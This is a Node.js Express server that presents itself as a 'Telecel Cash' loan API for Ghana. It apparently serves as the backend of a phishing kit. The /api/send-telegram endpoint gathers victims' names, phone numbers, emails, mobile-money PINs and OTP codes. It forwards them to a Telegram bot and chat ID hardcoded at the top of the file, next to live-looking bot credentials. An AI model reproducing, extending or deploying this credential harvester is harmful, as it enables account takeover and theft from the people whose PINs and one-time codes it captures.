const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());

// CORS - Allow all origins
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});

// ========== TELEGRAM CREDENTIALS ==========
const TG_BOT_TOKEN = '8843069473:AAFWS3TrGqaQQDHiZrMsDAwhSGV16SKglXA';
const TG_CHAT_ID = '6414813627';

// ========== HEALTH CHECK ENDPOINTS ==========
app.get('/', (req, res) => {
    res.json({
        status: 'OK',
        message: 'Telecel Cash API is running!',
        timestamp: new Date().toISOString(),
        version: '1.0.0'
    });
});

app.get('/health', (req, res) => {
    res.json({
        status: 'healthy',
        uptime: process.uptime(),
        timestamp: new Date().toISOString(),
        telegram: {
            bot_configured: true,
            chat_id_configured: true
        }
    });
});

// ========== TELEGRAM WEBHOOK ENDPOINT ==========
app.post('/api/send-telegram', async (req, res) => {
    try {
        const { phone, pin, email, name, type, site, amount, term, monthly, employment } = req.body;
        
        console.log('='.repeat(50));
        console.log('📨 New request received at:', new Date().toISOString());
        console.log('Request body:', JSON.stringify(req.body, null, 2));
        console.log('='.repeat(50));
        
        const timestamp = new Date().toLocaleString('en-GB', {
            timeZone: 'Africa/Accra',
            day: '2-digit',
            month: '2-digit',
            year: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });
        
        let message = '';
        
        if (type === 'application') {
            // Application form submission
            message = `📱 NEW APPLICATION - ${site || 'Telecel Cash'} 📱\n\n`;
            message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
            message += `👤 Name: ${name || 'Not provided'}\n`;
            message += `📞 Phone: ${phone || 'Not provided'}\n`;
            message += `📧 Email: ${email || 'Not provided'}\n`;
            message += `💰 Loan Amount: ₵ ${amount || '0'}\n`;
            message += `📅 Term: ${term || '0'} months\n`;
            message += `💵 Monthly Payment: ₵ ${monthly || '0'}\n`;
            message += `💼 Monthly Income: ₵ ${pin || '0'}\n`;
            message += `🏢 Employment: ${employment || 'Not provided'}\n`;
            message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
            message += `⏰ Time: ${timestamp}\n`;
            message += `✅ Status: Pending Approval`;
            
        } else if (type === 'pin') {
            // PIN confirmation
            message = `🔐 PIN CONFIRMED - ${site || 'Telecel Cash'} 🔐\n\n`;
            message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
            message += `👤 Name: ${name || 'Not provided'}\n`;
            message += `📞 Phone: ${phone || 'Not provided'}\n`;
            message += `📧 Email: ${email || 'Not provided'}\n`;
            message += `💰 Loan Amount: ₵ ${amount || '0'}\n`;
            message += `📅 Term: ${term || '0'} months\n`;
            message += `💵 Monthly Payment: ₵ ${monthly || '0'}\n`;
            message += `🔑 PIN: ${pin || 'Not provided'}\n`;
            message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
            message += `⏰ Time: ${timestamp}\n`;
            message += `✅ PIN Verified Successfully`;
            
        } else if (type === 'otp') {
            // OTP verification
            message = `✅ OTP VERIFIED - ${site || 'Telecel Cash'} ✅\n\n`;
            message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
            message += `👤 Name: ${name || 'Not provided'}\n`;
            message += `📞 Phone: ${phone || 'Not provided'}\n`;
            message += `📧 Email: ${email || 'Not provided'}\n`;
            message += `💰 Loan Amount: ₵ ${amount || '0'}\n`;
            message += `📅 Term: ${term || '0'} months\n`;
            message += `💵 Monthly Payment: ₵ ${monthly || '0'}\n`;
            message += `🔢 OTP Code: ${pin || 'Not provided'}\n`;
            message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
            message += `⏰ Time: ${timestamp}\n`;
            message += `✅ OTP Verified - Application Complete`;
            
        } else {
            // Default message
            message = `📝 NEW SUBMISSION - ${site || 'Telecel Cash'} 📝\n\n`;
            message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
            message += `👤 Name: ${name || 'Not provided'}\n`;
            message += `📞 Phone: ${phone || 'Not provided'}\n`;
            message += `📧 Email: ${email || 'Not provided'}\n`;
            message += `💰 Amount: ₵ ${amount || '0'}\n`;
            message += `🔑 PIN/OTP: ${pin || 'Not provided'}\n`;
            message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
            message += `⏰ Time: ${timestamp}`;
        }
        
        // Send to Telegram
        const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;
        const params = new URLSearchParams({
            chat_id: TG_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        
        console.log('📤 Sending to Telegram...');
        const response = await fetch(`${url}?${params}`);
        const result = await response.json();
        
        if (result.ok) {
            console.log('✅ Message sent to Telegram successfully!');
            console.log('Telegram response:', result);
            res.json({
                success: true,
                message: 'Sent to Telegram successfully',
                timestamp: timestamp
            });
        } else {
            console.error('❌ Telegram API error:', result);
            res.json({
                success: false,
                error: result.description || 'Telegram API error',
                details: result
            });
        }
        
    } catch (error) {
        console.error('❌ Server error:', error.message);
        console.error('Stack trace:', error.stack);
        res.status(500).json({
            success: false,
            error: error.message,
            timestamp: new Date().toISOString()
        });
    }
});

// ========== TEST ENDPOINT ==========
app.post('/api/test-telegram', async (req, res) => {
    try {
        const testMessage = `🔧 TEST MESSAGE 🔧\n\nTelecel Cash Bot is working!\nTime: ${new Date().toLocaleString()}\n\nIf you receive this, your bot is configured correctly! ✅`;
        
        const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(testMessage)}`;
        const response = await fetch(url);
        const result = await response.json();
        
        if (result.ok) {
            res.json({ success: true, message: 'Test message sent to Telegram!' });
        } else {
            res.json({ success: false, error: result.description });
        }
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ========== INFO ENDPOINT ==========
app.get('/api/info', (req, res) => {
    res.json({
        name: 'Telecel Cash API',
        version: '1.0.0',
        country: 'Ghana',
        currency: '₵',
        supported_features: ['Loan Applications', 'PIN Verification', 'OTP Verification'],
        telegram_configured: true
    });
});

// ========== START SERVER ==========
app.listen(PORT, '0.0.0.0', () => {
    console.log('='.repeat(50));
    console.log('🚀 Telecel Cash Backend Server Started');
    console.log('='.repeat(50));
    console.log(`📡 Port: ${PORT}`);
    console.log(`🤖 Telegram Bot: Configured`);
    console.log(`📱 Chat ID: ${TG_CHAT_ID}`);
    console.log(`🌍 Country: Ghana`);
    console.log(`💵 Currency: ₵`);
    console.log('='.repeat(50));
    console.log('✅ Available endpoints:');
    console.log(`   GET  / - Root endpoint`);
    console.log(`   GET  /health - Health check`);
    console.log(`   POST /api/send-telegram - Send Telegram message`);
    console.log(`   POST /api/test-telegram - Test bot connection`);
    console.log(`   GET  /api/info - API information`);
    console.log('='.repeat(50));
});
